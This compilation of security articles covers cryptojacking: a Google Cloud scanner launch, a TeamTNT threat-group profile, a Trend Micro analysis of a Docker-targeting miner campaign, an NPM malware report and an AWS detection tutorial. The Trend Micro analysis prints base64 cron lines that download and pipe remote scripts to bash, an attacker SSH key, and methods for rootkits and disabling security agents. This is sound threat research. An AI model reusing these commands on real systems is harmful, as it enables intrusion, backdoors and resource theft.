@@ -1,0 +1,473 @@
+Google Cloud launches agentless cryptojacking malware scanner
+The new security feature is designed to hunt down instances of cryptojacking.
+What to expect from MWC 2024
+
+Google Cloud has announced a new security feature designed to hunt down instances of cryptojacking.
+
+On Monday, the tech giant said the public preview of Virtual Machine Threat Detection (VMTD) is now available in the Security Command Center (SCC). The SCC is a platform for detecting threats against cloud assets by scanning for security vulnerabilities and misconfigurations. 
+
+more crypto
+How do I buy Bitcoin? Here's how it works
+The best crypto credit cards
+Top crypto exchanges: The ones you need to know
+Must-have cryptocurrency hardware wallets: Keep your cryptocurrency safe
+Timothy Peacock, Product Manager at Google Cloud, said that as organizations continue to migrate to the cloud, workloads are often handled with VM-based architectures. 
+
+Cloud environments are also a prime target for cyberattackers seeking out valuable data, as well as those intending to execute cryptocurrency mining malware. 
+
+Cryptocurrency miners such as XMRig are legitimate programs for mining coins. When in the hands of threat actors, cryptominers can be abused, however, and used without permission on cloud systems. 
+
+In what is known as cryptojacking attacks, miners are deployed on compromised systems to steal the victim's compute resources. Cryptocurrency including Monero (XMR) is often mined by cybercriminals in this way and coins are sent to wallets controlled by the malware's operators. 
+
+According to Google's latest Threat Horizons report (.PDF), out of a sample of compromised instances, 86% were used for cryptocurrency mining and 10% were used to perform scans for other vulnerable instances.
+
+To combat the specter of cryptojacking attacks against VMs operating in Google Cloud, the company's VMTD solution will provide "agentless memory scanning" inside SCC.
+
+"Traditional endpoint security relies on deploying software agents inside a guest virtual machine to gather signals and telemetry to inform runtime threat detection," Peacock said. "But as is the case in many other areas of infrastructure security, cloud technology offers the ability to rethink existing models."
+
+Google's approach is to instruct the hypervisor to collect signals that may indicate infection. VMTD will start as a means to detect cryptocurrency mining, but as it hits general availability, the system will be integrated with other Google Cloud functions. 
+
+Users can choose to try out VMTD by enabling it in SCC settings. The service is opt-in and customers can choose the scope of the scanner. 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Threat actor group, TeamTNT, compromised multiple cloud instances and containerized environments.
+Target list includes Docker, Redis server, AWS, and Kubernetes.
+Reconnaissance
+Credential Stealing
+Installing backdoors, rootkits stealer, botnets, and miners
+Maintain access and moving laterally
+Cryptojacking
+Network/ Port scanning tools
+Malicious Binaries
+Packers and Crypters
+Credential Stealers
+PWN Remote Services
+Analysis and Attribution
+History
+TeamTNT goes by the Twitter handle “@HildeTnT / HildeGard@TeamTNT”
+During their attack period, the group was very active on Twitter, posting and discussing:
+Attacks conducted
+Servers compromised
+Tools employed
+The group most likely originates from Germany because:
+Most of the tweets and bash scripts are in the German language.
+The account’s location is set to Deutschland.
+Comments in the bash scripts contain words from the German language.
+Information from OSINT
+The following Tweet made on the group’s official account, suggests that it is a collective of 12 individuals (or more if they hired new people in late 2020).
+[caption id="attachment_20458" align="aligncenter" width="1198"]TeamTNT’s Tweet about managing a group of 12 programmers TeamTNT’s Tweet about managing a group of 12 programmers[/caption]  
+TeamTNT’s Github profile contains 25 public repositories, most of which are the forks of the popular red teaming tools and other repositories possibly leveraged by them.
+The following domain was used by the group to host their malicious files and scripts while performing the attack: https://teamtnt[.]red.
+CloudSEK researchers were able to gather the following information about the domain:
+Domain was registered on 10 February 2020
+During the same time TeamTNT had begun to actively target Redis servers
+Domain is currently inactive
+Some screenshots of the domain are still available on Wayback Machine
+Timeline of TeamTNT
+[caption id="attachment_20459" align="alignnone" width="2048"]Event Timeline of TeamTNT Event Timeline of TeamTNT[/caption]  
+Redis Attacks (February 2020)
+The group has been active since February 2020 when they launched their first campaign targeting Redis servers.
+[caption id="attachment_20460" align="aligncenter" width="2048"]Attack flow for targeting the Redis server Attack flow for targeting the Redis server[/caption]  
+The motive behind the attack was cryptojacking and the following tools were used:
+pnscan - An open-source parallel network scanner, used to scan the whole internet and look for the services listening on the default Redis port (port: 6379). The setup script generates the payload that is executed on the Redis servers.
+Tsunami - An open-source botnet, aslo known as titan or ziggystartux, used to perform DDoS attacks against targets or to execute commands on the infected machine.
+xmrigCC - A tool used for mining crypto.
+watchdog.c - A type of monitoring tool used in Linux for monitoring the mining process.
+Punk.py - A post-exploitation tool meant to help network pivot from a compromised Unix box. This tool collects usernames, SSH keys, as well as known hosts from a Unix systemt and then tries to connect via SSH to all the combinations found.
+[caption id="attachment_20461" align="alignnone" width="2048"]Detailed breakdown of the setup script used in Redis campaign Detailed breakdown of the setup script used in Redis campaign[/caption]  
+Docker Attacks (May 2020)
+In May 2020, the group started targeting Docker by employing the same Bash scripts and malware.
+The group’s primary motive remained the same, i.e cryptojacking.
+A new tool was added to their arsenal:
+masscan - A TCP port scanner used to find misconfigured Docker services by scanning exposed ports and services. Once a victim is located, using masscan and zgrab, the attacker creates a container using Alpine image and passes an argument to the script which downloads and executes other malicious scripts.
+[caption id="attachment_20462" align="alignnone" width="2048"]Targeting Docker Instances using a Bash script Targeting Docker Instances using a Bash script[/caption]
+Improvised Docker Attacks (August 2020)
+The group continued their attacks on Docker however they started using the Ubuntu images directly instead of Alpine.
+The group started using a Linux Kernel Module (LKM) rootkit named Diamorphine to hide their activities on infected machines.
+AWS credential-stealing capabilities were added into their scripts.
+Weavescope Attacks (September 2020)
+TeamTNT added started exploiting Weavescope for troubleshooting and leveraging it as a backdoor for the following:
+Gaining full access to the victim’s cloud environment
+Monitoring Docker, Kubernetes, the Distributed Cloud Operating System (DC/OS), and AWS Elastic Compute Cloud (ECS)
+Running shell commands
+The group began using two new tools to steal credentials from browser history and network connections:
+Mimipy
+Mimipenguin
+The group also began using a simple Linux ELF runtime crypter, ezuri, to encrypt their malware for evading detection.
+Kubernetes Attacks (January 2021)
+Lacework Labs released a report on Tsunami (the bot used by TeamTNT) mentioning the following details:
+Only 90 of the 200 connected bots were detected with unique IP addresses from the previous scripts.
+Some of the bots behind a NAT service were sharing the same external IP address.
+Majority of the affected computers were Asian cloud instances hosted primarily by Tencent, Alibaba, and AWS.
+During this period, the group stopped attacking Redis instances and started targeting Kubernetes.
+Three new tools were being employed by the group:
+Peirates - An open-source Kubernetes Penetration Testing tool
+Botb - An open-source tool for container analysis and exploitation for Kubernetes
+libprocesshider - An open-source tool that uses the ID preloader to hide a process under Linux.
+Increased Credential Stealing Capabilities (June 2021)
+The group’s target list remained the same but they expanded their credential-stealing capabilities, to the following services and applications.
+AWS	Shodan	PostgreSQL
+S3 buckets	GCP	SMB
+Docker	ngrok	Hexchat
+SSH	MoneroGuiWallet	Filezilla
+Davfs2	GitHub	
+They added the plugin of AWS CLI in their script to exfiltrate maximum information about the instance inclduing resources, instance, roles, volumes, etc.
+Chimaera Campaign (July 2021)
+On 25 July 2021, TeamTNT launched a campaign named “Chimaera” where they continued their attacks on Docker, Kubernetes, and Weavescope services.
+To maintain transparency, the group created a dashboard on their website that displayed campaign statistics.
+[caption id="attachment_20463" align="alignnone" width="845"]Chimaera campaign dashboard to display statistics on the website Chimaera campaign dashboard to display statistics on the website[/caption]
+The group significantly improved their enumeration technique by adding over 70 unique AWS CLI commands designed to enumerate the following 7 AWS services:
+IAM configuration
+EC2 instances
+S3 buckets
+Support cases
+Direct connection
+CloudTrail
+CloudFormation
+They also started employing LaZagne, another open-source application, to enhance their credential-stealing capabilities.
+Techniques, Tactics & Procedures (TTPs)
+[caption id="attachment_20464" align="alignnone" width="1677"]TTPs employed by TeamTNT TTPs employed by TeamTNT[/caption]   TeamTNT essentially employed the same strategies across all of its campaigns, however they did it by making the following adjustments to their methods:
+Account manipulation by adding their own SSH authorized_keys on compromised servers.
+Installing a scanner to scan the entire internal network for lateral movements.
+Using process monitoring tools to restart processes.
+Using scripts to install all sorts of tools, malware, and miner.
+Packing binaries to evade normal security checks .
+Using obfuscation and encodings in bash scripts and while communicating through C2 servers.
+Using kernel-level rootkits to hide their process.
+Deploying own containers for attacks and mining.
+Using data stealing cloud service credentials.
+Resource hijacking and deploying XMRig Docker images to mine cryptocurrency.
+
+
+
+
+=====================================
+
+
+
+
+TeamTNT is a threat group that was known for primarily targeting the cloud and container environments around the world. This group has been documented to leverage the cloud and container resources by deploying cryptocurrency miners in the victim environments. While the group has been active since 2019 and announced it was quitting in 2021, our recent observations make it appear as if TeamTNT has returned — or a copycat group imitating the routines of TeamTNT — and has been deploying an XMRig cryptocurrency miner. Analysis of the attack patterns and other technical details of the code has also led us to believe that the routines are mimicking TeamTNT’s arsenal, but are likely deployed by another cryptocurrency mining group named WatchDog.
+
+Attack patterns
+
+Analysis of the samples in our honeypots revealed the following IP addresses establishing a connection to exposed Docker APIs over TCP that were previously documented to be involved in malicious activities:
+
+We tracked the majority of these IP addresses to have established connections from China while one came from Germany, making a series of requests to the exposed Docker API as follows:
+
+1.      The initial request made was to get the Docker version information.
+
+As seen in the User-Agent header field, this request seems like TeamTNT is using the legitimate utility ZGrab to scan for publicly exposed Docker API servers. Go-developed ZGrab is a banner-grabbing tool that is currently being deprecated. A newer version called ZGrab2 is the open-source tool currently available in GitHub. We observed the older utility being used in the malicious sample we analysed.
+
+Once the request identifies the available servers, the routine moves to the next steps.
+
+
+2.      A ping request checks if the API server is live.
+
+
+3.      Once the ping response is positive, the attackers perform a request to deploy the /containers/create endpoint to deploy an alpine-based container with instructions to download and execute the malicious shell script.
+
+As you can see from the image above, the request shows the following steps being executed:
+
+a.      Changes the root directory to /mnt
+
+b.      Installs curl
+
+c.      Creates the cron entry in crontab and /etc/cron.d to download the file cronb.sh from 205[.]185[.]118[.]246
+
+4.      Once the container deployment is successful, the attacker requests the Docker Daemon API to attach to the container and start it.
+
+The cronb.sh script
+
+The cronb.sh script is the first payload deployed by the attacker. We analysed this script performing many actions, downloading multiple shell scripts and an XMRIG miner, and compiling the Base64-encoded c code, amongst others. In this section, we summarise the actions performed by the script.
+
+The beginning functions of the script contains the command and control (C&C) server IP and port details.
+
+The script also performs the actions defined by the functions below:
+
+a.  check_exist
+
+The check_exist function checks if the miner process is running on the defined port 1414 with the help of netstat.
+
+b.  m_command
+
+The m_command function’s script sets the path of wget, curl, and chattr utilities. This process renames the chattr utility to zzhcht, probably so that other miners or malware would not be able to use this utility.
+
+The threat actor also hijacks the various system binaries, creates custom processes, and renames them with a tnt prefix, or TNTcurl, curltnt, and tntrecht suffixes. In this function, the script also checks if the binaries tntcurl or curltnt exists or not, and adds their path as environment variables. This has also been documented previously and attributed to TeamTNT.
+
+c.  ins_package:
+
+The ins_function function calls three functions after validating the package managers used in the operating system (OS) to install tools like gcc, make, and kmod to compile and install the source codes of rootkit and process hider code.
+
+d.  SetupNameServers
+
+In this function, the script configures the network settings to use the IP addresses 8[.]8[.]8[.]8 and 8[.]8[.]4[.]4 as the domain name system (DNS) servers via updating /etc/resolv.conf file by changing the file permissions to make it mutable. The said addresses are Google DNS servers.
+
+e.  download_f
+
+The download_f function downloads the XMRig miner xm.tar as crypto and the configuration file config.json as [cmake].pid, which contains the pool server IP address under the /usr/share directory.
+
+f.  setup_s
+
+The setup_s function installs the configuration file [cmake].pid as a service in the system under path </etc/systemd/system/cmake.service>.
+
+g.  makesshaxx
+
+The makesshaxx function’s script adds the attacker’s secure shell (SSH) public key in the files /root/.ssh/authorised_keys and /root/.ssh/authorised_keys2. The SSH public key we found:
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQcmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver
+
+A quick Google search showed that this key was previously used in other scripts related to Docker container attacks.
+
+h.  clean_monitor
+
+The clean_monitor function’s script disables various OS’ security and logging features:
+
+      a.      Clears the firewall rules from iptables
+
+      b.      Clears the bash history
+
+      c.       Disables SELinux, watchdog, AppArmor, and firewall service
+
+      d.      Uninstalls aegis (Alibaba’s cloud security agent), aliyun (Alibaba’s Cloud Monitor Service), and qcloud (Tencent Cloud's qcloud agents) services
+
+i.   clean_cron
+
+The clean_cron function’s script makes the cron files mutable and removes all the existing cron jobs from /etc/crontab, /var/spool/cron, /etc/cron.d, and /var/spool/cron/crontabs to disrupt the existing malware functionalities, as well as the legitimate system functionalities.
+
+j.  lock_cron
+
+The lock_cron function’s script makes the files immutable again by changing the attributes of the cron files, reversing the previous action so no one else can change those.
+
+k.  exec_hide
+
+The exec_hide function’s script checks that the rootkit is installed first or not. If not present, then it calls another function hide_f() to install the rootkit. In the function hide_f(), it decodes the Base64 encoded.tar file and compiles it under the directory /usr/share/..hide, and installs it as a kernel module with the help of the insmod command.
+
+l.  exec_hide2
+
+This is the other method the cybercriminals used to hide the processes via modifying the libc. This method uses an old technique to hide the specific process read in the /proc directory. The malicious code is encoded in Base64, the script decodes and compiles it as shared object file, and updates the /etc/ld.so.preload file.
+
+m.  clmo
+
+The clmo function’s script checks whether the current system is an instance in Alibaba cloud or not, disables the AliSecGuard, and stops aliyun and aegis services.
+
+n.  exe_remo
+
+This is the function responsible for lateral movement via SSH and deploys the b.sh file in the remote SSH server. This b.sh file is the same as this cronb.sh file. 
+
+In the same system, it downloads the s.sh script and executes it. This script is responsible for:
+
+      a.      Installing ZGrab, an application layer scanner, to scan the Docker services.
+
+      b.      Installing pnscan, a port scanner, to scan a whole subnet for a Redis server.
+
+      c.       Installing masscan, another port scanner, to scan for a Redis server.
+
+      d.      Installing various utilities from the OS package repositories like iptables, unhide, gcc, redis-tools, and Redis server, amongst others.
+
+      e.      Downloading the other supporting shell scripts c.sh and d.sh, and installs them as a service.
+
+There have also been observations on these tools as being a part of TeamTNT’s arsenal in previous attacks.
+
+
+Looking at c.sh and d.sh
+
+As mentioned, s.sh installs various tools needed to infect and move around. The c.sh and d.sh scripts make use of those tools. The c.sh script allows the threat actor to perform these actions:
+
+      a.      Create a firewall rule in iptables for the Redis-server communication 
+
+
+      b.      Utilizes all the scanning tools downloaded by the previous script (s.sh)
+
+      c.      Adds the following cron job instruction into a.dat file:
+
+                                                i.          */2 * * * * root echo Y2QxIGh0dHA6Ly9raXNzLmEtZG9nLnRvcC9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash
+
+Base64 decoded string: cd1 http[:]//kiss.a-dog.top/b2f628/b.sh
+
+                                               ii.          */3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash
+
+Base64 decoded string: wget -q -O- http[:]//kiss.a-dog.top/b2f628/b.sh
+
+                                              iii.          */4 * * * * root echo Y3VybCBodHRwOi8va2lzcy5hLWRvZy50b3AvYjJmNjI4L2Iuc2gK|base64 -d|bash|bash
+
+Base64 decoded string: curl http[:]//kiss.a-dog.top/b2f628/b.sh
+
+                                              iv.          c2V0IGJhY2t1cDQgIlxuXG5cbkBob3VybHkgcm9vdCAgcHl0aG9uIC1jIFwiaW1wb3J0IHVybGxpYjI7IHByaW50IHVybGxpYjIudXJsb3BlbihcJ2h0dHA6Ly9raVxcc1xccy5hLWRcXG9nLnRcXG9ccC90LnNoXCcpLnJlYWQoKVwiID4uMTtjaG1vZCAreCAuMTsuLy4xXG5cbiIK
+
+Base64 decoded string: set backup4 "\n\n\n@hourly root  python -c \"import urllib2; print urllib2.urlopen(\'http[:]//ki\\s\\s.a-d\\og.t\\o\p/t.sh\').read()\" >.1;chmod +x.1;./.1\n\n"
+
+While scanning with the tools (masscan and pnscan) for the available Redis server in the network, it reads the.dat file and sends the instruction from the file to the Redis server to add cron jobs to download these shell scripts.
+
+
+The d.sh script has the least number of instructions amongst all the shell scripts used in this routine. This script uses the ZGrab scanner to scan for the available Docker API servers on both TCP ports 2375 (for unencrypted communication with the daemon) and 2376 (for encrypted communication with the daemon) in the network. It then deploys the Alpine Docker image via docker API.
+
+In the above Docker image deployment, d.sh adds a cron job to download and run cronb.sh from 205[.]185[.]118[.]246 and t.sh from the domain http[:]//kiss[.]a-dog[.]top/t[.]sh.
+
+This file also contains the TeamTNT’s banner in a Base64-encoded string. 
+
+Trend Micro solutions
+
+Trend Micro™ Cloud One Workload Security™ and Trend Micro Vision One™ can detect these malicious activities and can be protected via these detections:
+
+Trend Micro Cloud OneTM Workload Security
+
+T1105 - Ingress Tool Transfer
+
+T1071.001 - Application Layer Protocol: Web Protocols
+
+T1613 - Container and Resource Discovery
+
+T1046 - Network Service Discovery
+
+Trend Micro Vision OneTM  Workbench App
+
+The Trend Micro Vision One Workbench App helps analysts see the significant correlated events that are intelligently based on the occurrences that happened throughout the entire fleet of workloads. The left side of the diagram shows the summarised sequence of events happening one after another. Analysts can view the different fields of interest that are considered important and provide security value on the connections seen on the right. The app allows security teams to see the compromised assets and isolate those that can be potentially affected while patching procedures are ongoing.
+
+Conclusion
+
+The threat actor goes through a series of actions for deploying the cryptocurrency miner. The routine abuses the Docker infrastructure to infect, download, and run various shell scripts using tools like ZGrab, massscan, pnscan, and Redis to spread in a worm-like fashion to install an XMRig. This attack uses tactics, techniques, and procedures (TTPs) consistent with those of TeamTNT’s, such as the banner and the use of the identified utilities. However, TeamTNT’s behaviour is well-known by now, and this does not conclusively identify the group as the threat actor responsible for this sample. Currently, one of the domains used, oracle[.]zzhreceive[.]top, is linked with the cryptocurrency mining group WatchDog, which has been documented utilising the same domain as TeamTNT. Researchers have also previously observed that “s3f815” and “b2f628” have been used in the directory name convention found in URLs, and the “1.0.4.tar.gz” label used in the file names used by this group.
+
+Moreover, since TeamTNT already announced that it was quitting, all these details show that either WatchDog is behind this campaign and likely using the name of TeamTNT, or someone else is mimicking the cybercriminal group. While we do not discount the possibility that TeamTNT can return and using the same routines as well, we will continue to monitor these threats and post updates accordingly.
+
+
+
+
+==========
+
+The NPM JavaScript registry has experienced a jump in malware, including packages related to data theft, crypto mining, botnets, and remote code execution, according to security company WhiteSource.			
+
+
+
+The popular NPM JavaScript package manager and registry has been hit with an influx of malicious packages, the most harmful of which are related to data theft, crypto mining, botnets, and remote code execution, according to research from security company WhiteSource.
+
+WhiteSource’s automated malware detection platform, WhiteSource Diffend, detected a total of 1,300 malicious packages on NPM, within a period of six months ended December 2021. 
+
+All the malicious packages identified by WhiteSource were notified to NPM and were subsequently removed from the package registry.  
+
+NPM is a widely used package manager and registry with more than 1.8 million active packages, each package having a little more than 12 versions on average. A package is a prewritten set of useful functions that can be called into a programming environment without having to write each and every line of code from scratch. A package manager is an enabler created with open-source code that helps install or update these packages. NPM is a default package manager for the widely used JavaScript runtime environment Node.js. 
+
+NPM has become a constant target by bad actors, according WhiteSource. A report recently published by WhiteSource says that 57% of attacks happen during three days of the week — Friday, Saturday and Sunday. Most of these (81.7%) are “reconnaissance” attacks, consisting of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Another 14% of the attacks are designed to steal information like credentials and other sensitive details.  
+
+Some of the newer malware detected by WhiteSource included: 
+
+The majority of these attacks fall under four harmful threat categories including cryptomining, data stealing, botnets, and security research. The security research packages are those that pose as security research programs, but in reality, contain remote code execution (RCE) intended to gain full access into a host.
+
+Other less harmful packages included script kiddies and SEO hacks. “Script kiddies are packages that do not cause harm or collect data but print disturbing messages like ‘You have been hacked’,” says Maciej Mansfeld, senior project manager at WhiteSource. “A few packages also try to exploit the fact that NPM displays the README of packages on its online registry to build up SEO for their online presence. We’ve seen online casinos and erotic websites trying to exploit that.” 
+
+The report recommends caution especially regarding attacks that look to exploit dependency confusion in NPM, and the fact that most of the bad code need not even be downloaded manually for the attack to work.  
+
+“A dependency confusion attack is a type of supply chain attack which occurs when a package manager is being manipulated into supplying a malicious code instead of the intended code,” says Mansfeld. “The most famous method to exploit this vulnerability is via a package managers’ prioritization mechanism to supply the latest versions.” 
+
+In such cases, when attackers successfully find an internal dependency package name, they can then create a public package with the same name with a higher version number. The malicious public package will then be preferred by the package manager and automatically installed whenever an update is called. 
+
+The report recommends adopting a zero trust policy on the system, updating only when confident about the content of a package; being aware of the environment and tracking changes regularly; running continuous integration (CI) in isolated stage; and keeping close tabs on the SDLC (software development life cycle).  
+
+Watching out for packages that download remote components upon installation, and keeping track of all OSS (operation support system) components being used, are also good sanitary routines for NPM end users, according to Mansfeld.  
+
+Shweta Sharma is a senior journalist covering enterprise information security and digital ledger technologies for IDG’s CSO Online, Computerworld, and other enterprise sites.
+
+
+
+===================
+
+Machine learning (ML) at the edge requires powerful edge requires powerful edge devices with a unique set of requirements. The availability, safety, and security requirements for the edge differ from cloud since they are located at the customer site, outside the data center, and interface directly with operational technology (OT) and the internet. Since edge locations often lack the physical security that data centers have and lack the security controls available in the cloud, they have become attractive targets for bad actors such as cryptocurrency miners. In many cases, edge devices don’t have anti-malware defenses making it even more difficult to detect cryptocurrency mining activity.
+
+An end-to-end security model that protects edge devices from hostile networks and protects sensitive data and ML models is paramount for a successful deployment. Customers can use AWS IoT Device Defender to help audit and monitor their edge device fleet. In this blog post, we show you the steps involved in helping to detect and mitigate cryptocurrency mining threats on edge devices using AWS IoT Device Defender custom metrics.
+
+Cryptocurrency, sometimes called crypto-currency or crypto, is any form of currency that exists digitally or virtually and uses cryptography to secure transactions. Cryptocurrency mining is a process of creating new digital coins and is a compute intensive activity that has been on the rise in recent years.
+
+Cryptojacking is a type of cybercrime that involves the unauthorized use of devices (edge computers, smartphones, tablets, or even servers) to mine for cryptocurrency and illicitly create currency. As cryptocurrency prices rise and more powerful edge devices with GPU capabilities are used to run ML at the edge use cases, there is an increasing threat of cryptojackers to exploit security vulnerabilities on edge devices. When this happens, edge computing resources are used to mine crypto currency resulting in higher CPU/GPU usage and a degradation in performance of edge applications and an increase in ML at the edge inference processing times.
+
+In this blog, we show you how to monitor CPU/GPU usage and ML at the edge inference processing time with custom metrics that can help indicate crypto currency mining activity on edge devices. AWS IoT Device Defender custom metrics are metrics you define that are unique to your devices and use case. In this cryptocurrency mining cyber security use case, you can monitor for anomalies using two custom metrics – CPU/GPU usage metric and average ML at the edge inference time metric. More information about using AWS IoT Device Defender for detecting cryptocurrency mining can be found here. Note that to investigate an anomaly, you need to correlate the alarm details with other contextual information such as device attributes, device metric historical trends, security profile metric historical trends, standard metrics, and logs to determine if a security threat is present.
+
+Our edge security solution for detecting cryptocurrency mining threats implements edge application management with AWS IoT Greengrass, custom metrics data collection and ingestion to the cloud with AWS IoT Greengrass custom components and AWS IoT Device Defender for security profile definition and monitoring.
+
+The steps to implement the solution are as follows:
+
+ Figure: Solution architecture to help monitor and detect edge devices for crypto currency mining threats
+
+Connect to your development computer using AWS CLI or AWS Cloud9 instance. This blog post deploys the solution to the us-east-1 (N. Virginia) region by default. You’ll see instructions to change the region in case you want to deploy to another region.
+
+First, run the following to install AWS IoT Greengrass Development Kit to test and publish custom AWS IoT Greengrass components.
+
+We use a slightly modified version of a public and open source AWS IoT Device Defender component for AWS IoT Greengrass. The modifications are mainly enhanced debugging/logging for easier development workflow and custom metrics definitions for simulated GPU resource metrics and ML at the edge inference time metrics.
+
+The public AWS IoT Device Defender component is deployed from the central AWS IoT Greengrass component repository, but the modified version will be stored in your own account.
+
+Clone the Git repository of this blog post and run the component repository build script:
+
+Run the following to build and publish the AWS IoT Greengrass component. To change the default region us-east-1, modify region section in the com.awsiotblog.DeviceDefenderCustom/gdk-config.json file.
+
+Go to AWS IoT Greengrass console > Components to confirm your component is published.
+
+
+
+In this section, we’ll use docker containers to create an AWS IoT Greengrass device to simulate and represent your edge device.
+
+The Dockerfile in the repository will allow us to get the base AWS IoT Greengrass container image and build it with some GPU resource metric measurement files.
+
+Run the following to build the AWS IoT Greengrass device container.
+
+The AWS IoT Greengrass container requires AWS credentials to provision these resources and deploy the local development tools. Create an IAM user with Minimal IAM policy for installer to provision resources or retrieve temporary AWS credentials from a role that has the same minimal IAM policy to provide it to the container. For details, see Run AWS IoT Greengrass in a Docker container with automatic resource provisioning.
+
+Create a folder where you place your credential file.
+
+Create a configuration file named credentials in the ./greengrass-v2-credentials folder. Add your AWS credentials to the credentials file in the following format.
+
+Include aws_session_token for temporary credentials only. Run the following to create, provision and initialize an AWS IoT Greengrass device. This container will represent your edge device with GPU resources.
+
+After running the docker container, you’ll see the final log output as the following; this indicates your virtual AWS IoT Greengrass device is provisioned and started successfully.
+
+… Launching Nucleus… Launched Nucleus successfully..
+
+NOTE: After creating the first container, you can run the command with different THING_NAME inputs to create more virtual edge devices.
+
+You can go to AWS IoT > Manage > Greengrass devices > Core devices to see the created AWS IoT Greengrass devices.
+
+
+
+Now, it’s time to deploy some components to your newly created device, including the custom/modified AWS IoT Device Defender component.
+
+Before deploying the component, run the following command to allow the AWS IoT Greengrass device to download component artifacts from Amazon Simple Storage Service (Amazon S3).
+
+The deployed virtual device is added into gg-awsiot-blog thing group. So, you’ll create a deployment that targets the gg-awsiot-blog thing group.
+
+After creating the deployment, your device will receive the deployment, apply it and report the status to the cloud. Finally; you’ll see the Core devices section in the deployment details page as your device reported as Healthy.
+
+
+
+Now, you have your AWS IoT Greengrass device reporting device-side metrics and custom metrics to AWS IoT Device Defender. You can check the actual payloads that the component publishes.
+
+Copy and paste the output JSON to your favorite JSON parser/viewer to check the metrics published from your devices.
+
+Firstly, you’ll start with definition of the custom metrics in AWS IoT Device Defender:
+
+Now, AWS IoT Device Defender is able to monitor two defined custom metrics from the edge devices.
+
+You can proceed to create a security profile that uses custom the GPU metric and the ML at the edge average inference time metric to evaluate the cryptocurrency threat situation.
+
+
+
+Now our simulated AWS IoT Greengrass device runs in a container and publishes device side metrics along with custom metrics to AWS IoT Device Defender service. Current values of custom metrics are within the expected behavior of the device.
+
+In each container, there are two files that represent custom metrics as /var/gpu_load_fb and /var/gpu_inference_fb; similar to other available system metrics like CPU temperature, load … etc. The custom AWS IoT Device Defender component is configured to read metric values from those files for each metric publish operation.
+
+Now, you’ll update the values in those files to simulate the condition of a cryptocurrency mining activity on your GPU-powered device, along with your ML model. Increase of GPU load and average ML model inference time will represent this situation as an abnormality.
+
+After running the update, you can check the published payloads for the device to see the increasing custom metrics in the payload, using the following command.
+
+Once metrics are delivered to the AWS IoT Device Defender service and evaluated by the service, you’ll see the alarm status on the Security Profile page.
+
+
+
+Congrats! You made the AWS IoT Device Defender service monitor and detect an abnormal behavior by configuring your edge device to send GPU load and ML at the edge inference time custom metrics to help detect cryptocurrency mining threat at the edge.
+
+Lastly, note that we’ve created the security profile with no automated actions. In this case, the alarm status appears only on the AWS IoT Device Defender console and you are able to start a mitigation action on the console. You can also create and set an Amazon Simple Notification Service in the security profile to notify users or other services and take customized automated actions in case of an AWS IoT Device Defender alarm. Check the documentation for the AWS IOT Device Defender Mitigation Actions for more information.
+
+It is important to quickly detect signs of cryptocurrency mining activity on your edge devices, so that you can protect your IoT/IIoT solution and maintain edge application performance. In this blog post, we demonstrated how to define custom metrics in AWS IoT Device Defender to monitor CPU/GPU usage and average ML at the edge inference time to help detect cryptocurrency mining activities by creating a rule-based security profile. Alternatively, customers could use AWS IoT Device Defender ML Detect to automatically set the security profile with custom metrics. The solution can be extended by using this example to create your own custom metrics unique to your device fleet or use case, get alerts, and take mitigation actions using AWS IoT Device Defender. You can read about other security use cases which AWS IoT Device Defender can support. In addition to using AWS IoT Device Defender to audit and monitor your fleet of IoT devices, AWS recommends following the Ten security golden rules for IIoT solutions, Implementing zero trust IoT solutions, Securing IoT with AWS whitepaper and AWS IoT Lens and being alert to the latest cryptojacking trends.
+
+
+========================
+
+
+
